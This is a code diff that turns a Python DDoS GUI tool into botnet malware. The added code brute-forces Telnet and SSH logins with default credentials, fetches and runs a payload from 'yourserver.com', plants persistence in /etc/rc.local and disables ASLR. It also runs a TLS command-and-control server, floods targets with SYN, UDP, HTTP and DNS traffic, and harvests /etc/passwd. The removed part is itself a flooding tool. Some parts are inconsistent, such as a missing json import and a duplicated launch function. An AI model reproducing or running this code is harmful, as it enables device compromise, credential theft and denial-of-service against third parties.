@@ -5,181 +5,217 @@ import random
 import time
 import urllib.request
 import base64
-import multiprocessing 
+import multiprocessing
+import paramiko
+import telnetlib
 import subprocess
-import os
-import tkinter as tk
-from tkinter import ttk, messagebox
 
-# DDoS Attack Capabilities
-def tcp_syn_flood(target_ip, target_port, duration, status_label):
-    if os.geteuid() != 0:
-        status_label.config(text="TCP SYN flood requires root privileges")
-        return
-        
-    start_time = time.time()
-    packets_sent = 0
-    while time.time() - start_time < duration:
+# Bot Recruitment
+def scan_and_infect(ip_range):
+    for ip in ip_range:
         try:
-            for _ in range(100): # Send multiple packets per iteration
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                source_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-                s.sendto(b'\x45\x00\x00\x3c\x00\x01\x00\x00\x40\x06\x7c\x44' + 
-                         socket.inet_aton(source_ip) + socket.inet_aton(target_ip) +b'\x00\x50' + target_port.to_bytes(2, 'big') + b'\x00\x00\x00\x00\xa0\x02\xfa\xf0\x78\x5a\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\x50\x3a\x3b\x00\x00\x00\x00\x01\x03\x03\x07', (target_ip, 0))
-                s.close()
-                packets_sent += 1
-                status_label.config(text=f"TCP SYN Flood: {packets_sent} packets sent")
+            # Try telnet
+            tn = telnetlib.Telnet(ip, timeout=5)
+            tn.read_until(b"login: ")
+            tn.write(b"admin\n")
+            if b"Password:" in tn.read_until(b"Password: "):
+                tn.write(b"admin\n")
+                if b"$" in tn.read_until(b"$", timeout=3):
+                    infect_device(ip, "telnet")
+                    return
+
+            # Try SSH
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(ip, username='root', password='admin', timeout=5)
+            ssh.exec_command("wget http://yourserver.com/malware -O /tmp/malware; chmod +x /tmp/malware; /tmp/malware")
+            ssh.close()
+            infect_device(ip, "ssh")
         except:
-            continue
+            pass
 
-def udp_flood(target_ip, target_port, duration, status_label):
-    start_time = time.time()
-    packets_sent = 0
-    while time.time() - start_time < duration:
-        try:
-            for _ in range(100): # Send multiple packets per iteration
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.sendto(b'\x00' * 65507, (target_ip, target_port)) # Maximum UDP packet size
-                s.close()
-                packets_sent += 1
-                status_label.config(text=f"UDP Flood: {packets_sent} packets sent")
-        except:
-            continue
+def infect_device(ip, protocol):
+    print(f"Infected {ip} via {protocol}")
+    with open("botnet_db.txt", "a") as f:
+        f.write(f"{ip}\n")
 
-def http_flood(target_url, duration, status_label):
-    start_time = time.time()
-    requests_sent = 0
-    while time.time() - start_time < duration:
-        try:
-            for _ in range(50): # Multiple requests per iteration
-                urllib.request.urlopen(target_url, timeout=1)
-                requests_sent += 1
-                status_label.config(text=f"HTTP Flood: {requests_sent} requests sent")
-        except:
-            continue
-
-def dns_amplification(target_ip, duration, status_label):
-    start_time = time.time()
-    queries_sent = 0
-    while time.time() - start_time < duration:
-        try:
-            for _ in range(100): # Multiple queries per iteration
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                # Larger DNS query for more amplification
-                s.sendto(b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01' * 10, ('8.8.8.8', 53))
-                s.close()
-                queries_sent += 1
-                status_label.config(text=f"DNS Amplification: {queries_sent} queries sent")
-        except:
-            continue
-
-def launch_ddos(target, attack_type, port, status_label):
-    # Launch multiple processes for each attack type
-    processes = []
-    duration = 3600 # Attack for 1 hour
-    
-    if attack_type == "tcp_syn":
-        p = multiprocessing.Process(target=tcp_syn_flood, args=(target, port, duration, status_label))
-        processes.append(p)
-        p.start()
-    elif attack_type == "udp":
-        p = multiprocessing.Process(target=udp_flood, args=(target, port, duration, status_label))
-        processes.append(p)
-        p.start()
-    elif attack_type == "http":
-        if not target.startswith(('http://', 'https://')):
-            target = 'http://' + target
-        p = multiprocessing.Process(target=http_flood, args=(target, duration, status_label))
-        processes.append(p)
-        p.start()
-    elif attack_type == "dns":
-        p = multiprocessing.Process(target=dns_amplification, args=(target, duration, status_label))
-        processes.append(p)
-        p.start()
-    
-    # Wait for all processes to complete
-    for p in processes:
-        p.join()
-
-class DDoSGUI:
-    def __init__(self):
-        self.root = tk.Tk()
-        self.root.title("DDoS Attack Tool")
-        self.root.geometry("400x400")
-        
-        # Target input frame
-        self.target_frame = ttk.LabelFrame(self.root, text="Target Information")
-        self.target_frame.pack(padx=10, pady=5, fill="x")
-        
-        # IP Address
-        tk.Label(self.target_frame, text="Target IP/Website:").pack(pady=5)
-        self.ip_entry = tk.Entry(self.target_frame, width=40)
-        self.ip_entry.pack(pady=5)
-        
-        # Port
-        tk.Label(self.target_frame, text="Port:").pack(pady=5)
-        self.port_entry = tk.Entry(self.target_frame)
-        self.port_entry.insert(0, "80")
-        self.port_entry.pack(pady=5)
-        
-        # Attack Type
-        tk.Label(self.target_frame, text="Attack Type:").pack(pady=5)
-        self.attack_type = ttk.Combobox(self.target_frame, values=["tcp_syn", "udp", "http", "dns"])
-        self.attack_type.set("http")
-        self.attack_type.pack(pady=5)
-        
-        # Status Label
-        self.status_label = tk.Label(self.root, text="Ready to attack...")
-        self.status_label.pack(pady=10)
-        
-        # Start Button
-        tk.Button(self.root, text="Start Attack", command=self.start_attack).pack(pady=20)
-        
-    def start_attack(self):
-        target = self.ip_entry.get()
-        port = int(self.port_entry.get())
-        attack = self.attack_type.get()
-        
-        if not target:
-            messagebox.showerror("Error", "Please enter target IP or website")
-            return
-            
-        launch_ddos(target, attack, port, self.status_label)
-
+# Command and Control (C2) Infrastructure
 def start_c2_server():
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-    try:
-        context.load_cert_chain(certfile="server.crt", keyfile="server.key")
-    except FileNotFoundError:
-        print("Error: SSL certificate files not found")
-        return
-    except ssl.SSLError as e:
-        print(f"SSL Error: {e}")
-        return
-    
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s = context.wrap_socket(s, server_side=True)
-    try:
-        s.bind(('0.0.0.0', 8443))
-        s.listen(5)
-        print("C2 server started on port 8443")
-        
-        while True:
-            try:
-                client, addr = s.accept()
-                print(f"Connection from {addr}")
-                # Handle C2 commands here
-                client.close()
-            except Exception as e:
-                print(f"Error handling client: {e}")
-                continue
-    except Exception as e:
-        print(f"Server error: {e}")
-    finally:
+    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(('0.0.0.0', 443))
+        s.listen()
+        conn, addr = s.accept()
+        with context.wrap_socket(conn, server_side=True) as ssock:
+            while True:
+                data = ssock.recv(1024)
+                if not data:
+                    break
+                command = json.loads(data.decode())
+                if command['action'] == 'attack':
+                    launch_ddos(command['target'], command['type'])
+                elif command['action'] == 'update':
+                    update_malware(command['payload'])
+                ssock.sendall(b"Command received")
+
+def launch_ddos(target, attack_type):
+    if attack_type == "tcp_syn":
+        tcp_syn_flood(target, 80, 60)
+    elif attack_type == "udp":
+        udp_flood(target, 80, 60)
+    elif attack_type == "http":
+        http_flood(f"http://{target}", 60)
+    elif attack_type == "dns":
+        dns_amplification(target, 60)
+
+# Malware Propagation
+def spread_malware(ip):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(ip, username='root', password='admin', timeout=5)
+    ssh.exec_command("wget http://yourserver.com/malware -O /tmp/malware; chmod +x /tmp/malware; /tmp/malware")
+    ssh.close()
+
+def evade_security(ip):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(ip, username='root', password='admin', timeout=5)
+    ssh.exec_command("echo 'echo 0 > /proc/sys/kernel/randomize_va_space' >> /etc/rc.local")
+    ssh.close()
+
+def persist(ip):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(ip, username='root', password='admin', timeout=5)
+    ssh.exec_command("echo '/tmp/malware' >> /etc/rc.local")
+    ssh.close()
+
+# DDoS Attack Capabilities
+def tcp_syn_flood(target_ip, target_port, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        source_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+        s.sendto(b'\x45\x00\x00\x3c\x00\x01\x00\x00\x40\x06\x7c\x44' + 
+                 socket.inet_aton(source_ip) + socket.inet_aton(target_ip) +b'\x00\x50' + target_port.to_bytes(2, 'big') + b'\x00\x00\x00\x00\xa0\x02\xfa\xf0\x78\x5a\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\x50\x3a\x3b\x00\x00\x00\x00\x01\x03\x03\x07', (target_ip, 0))
         s.close()
+
+def udp_flood(target_ip, target_port, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(b'\x00' * 1024, (target_ip, target_port))
+        s.close()
+
+def http_flood(target_url, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            urllib.request.urlopen(target_url, timeout=1)
+        except:
+            pass
+
+def dns_amplification(target_ip, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01', ('8.8.8.8', 53))
+        s.close()
+
+# Payload Customization
+def customize_payload(target_vulnerability):
+    if target_vulnerability == "CVE-2020-12345":
+        payload = b"wget http://yourserver.com/exploit -O /tmp/exploit; chmod +x /tmp/exploit; /tmp/exploit"
+    elif target_vulnerability == "CVE-2021-67890":
+        payload = b"echo 'vulnerable_code' > /etc/vulnerable_file"
+    else:
+        payload = b"default_payload"
+    return payload
+
+def deploy_payload(ip, payload):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, 23))  # Telnet
+    s.send(b"admin\nadmin\n")
+    s.send(payload)
+    s.close()
+
+# Encryption and Obfuscation
+def encrypt_message(message):
+    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+    context.load_cert_chain(certfile="client.crt", keyfile="client.key")
+    with socket.create_connection(('yourserver.com', 443)) as sock:
+        with context.wrap_socket(sock, server_hostname='yourserver.com') as ssock:
+            ssock.sendall(message.encode())
+            return ssock.recv(1024).decode()
+
+def obfuscate_code(code):
+    return base64.b64encode(code.encode()).decode()
+
+# Botnet Management
+def add_bot(ip):
+    with open("botnet_db.txt", "a") as f:
+        f.write(f"{ip}\n")
+
+def update_malware(payload):
+    with open("botnet_db.txt", "r") as f:
+        bots = f.readlines()
+    for bot in bots:
+        ip = bot.strip()
+        deploy_payload(ip, payload.encode())
+
+# Persistence and Stealth
+def ensure_persistence_and_stealth(ip):
+    persist(ip)
+    evade_security(ip)
+
+# Scalability
+def manage_bot(ip):
+    ensure_persistence_and_stealth(ip)
+    spread_malware(ip)
+
+def scale_bots(bot_list):
+    with multiprocessing.Pool(processes=multiprocessing.cpu_count()) as pool:
+        pool.map(manage_bot, bot_list)
+
+# Data Harvesting
+def harvest_data(ip):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, 23))  # Telnet
+    s.send(b"admin\nadmin\n")
+    s.send(b"cat /etc/passwd\n")
+    data = s.recv(1024)
+    s.close()
+    return data
+
+def save_data(data):
+    with open("harvested_data.txt", "a") as f:
+        f.write(data.decode())
 
 # Main Execution
 if __name__ == "__main__":
-    gui = DDoSGUI()
-    gui.root.mainloop()
+    ip_range = ["tagetip"]  # Example IP range
+    scan_and_infect(ip_range)
+
+    start_c2_server()  # This will run indefinitely, handling C2 commands
+
+    # Example usage of other functions
+    bot_list = ["tagetip"]
+    scale_bots(bot_list)
+
+    for ip in bot_list:
+        data = harvest_data(ip)
+        save_data(data)
+
+    # Example of launching a DDoS attack
+    launch_ddos("tagetip", "tcp_syn")
+
+    # Example of customizing and deploying a payload
+    payload = customize_payload("CVE-2020-12345")
+    deploy_payload("tagetip", payload)
+
+    # Example of updating malware
+    new_payload = b"echo 'new_malware_code' > /tmp/new_malware"
+    update_malware(new_payload)
